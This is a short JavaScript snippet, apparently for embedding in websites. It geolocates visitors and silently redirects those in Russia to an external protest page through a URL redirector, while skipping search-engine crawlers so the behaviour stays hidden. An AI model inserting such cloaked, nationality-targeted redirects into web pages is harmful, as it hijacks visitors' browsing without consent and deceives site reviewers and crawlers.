var redirectCountry = "RU";
var otherSite = "https://url.rw/?https%3A%2F%2Foutdatedregime.github.io%2Fchange%2F";
fetch("https://ipapi.co/country/")
    .then((response) => {
        if (response.ok) {
            return response.text();
        } else {
            throw new Error("HTTP Error " + response.status);
        }
    })
    .then((country) => {
        if (country == redirectCountry) {
            // Double checking if it is a human or a bot like Google
            if(isHuman()){
                // Action needed - redirecting visitor to warning about outdated regime.
                window.location = otherSite;
            }
        }
    })
    .catch(function (error) {
        // Network error
        // Script blocked by browser extension
        // 429 error (too many requests)
        console.log(error);
});

function isHuman() {
  if (
    /bot|google|baidu|bing|msn|teoma|slurp|yandex/i.test(navigator.userAgent)
  ) {
    return false;
  } else {
    return true;
  }
}
